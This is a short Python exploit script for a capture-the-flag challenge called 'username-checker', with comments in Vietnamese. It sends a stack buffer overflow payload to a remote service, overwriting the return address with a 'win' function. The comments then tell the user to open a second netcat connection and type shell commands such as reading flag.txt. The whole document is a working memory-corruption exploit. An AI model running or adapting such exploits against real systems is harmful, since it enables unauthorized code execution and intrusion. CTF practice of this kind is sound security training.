#!/usr/bin/env python3
import socket, struct, time

HOST, PORT = "username-checker.challs.sekai.team", 1337
OFFSET = 72
WIN   = 0x401236
MAIN  = 0x4013d3

def p64(x): return struct.pack("<Q", x)

s = socket.create_connection((HOST, PORT))
# ăn banner
s.recv(4096)
payload = b"A"*OFFSET + p64(WIN) + p64(MAIN) + b"\n"
s.sendall(payload)

print("[!] Đã gửi payload. GIỮ socket này mở (đừng kill).")
print("[!] Mở 1 terminal khác, dùng nc để kết nối và gõ lệnh (ls, cat flag.txt, ...).")
print("    Ví dụ: nc username-checker.challs.sekai.team 1337")
print("    (nếu service cho phép multi-conn cùng socket backend)")
time.sleep(999999)
